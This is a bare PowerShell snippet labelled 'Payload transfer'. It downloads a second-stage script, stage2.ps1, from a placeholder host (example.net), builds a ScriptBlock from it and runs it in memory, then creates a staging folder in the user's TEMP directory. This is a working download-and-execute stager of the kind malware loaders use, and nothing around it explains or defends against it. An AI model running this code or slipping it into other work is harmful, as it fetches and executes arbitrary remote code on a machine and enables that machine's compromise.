
# Payload transfer
$FetchUrl = "http://example.net:80/stage2.ps1"
$StageScript = (iwr $FetchUrl -UseBasicParsing).Content
[ScriptBlock]::Create($StageScript).Invoke()
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
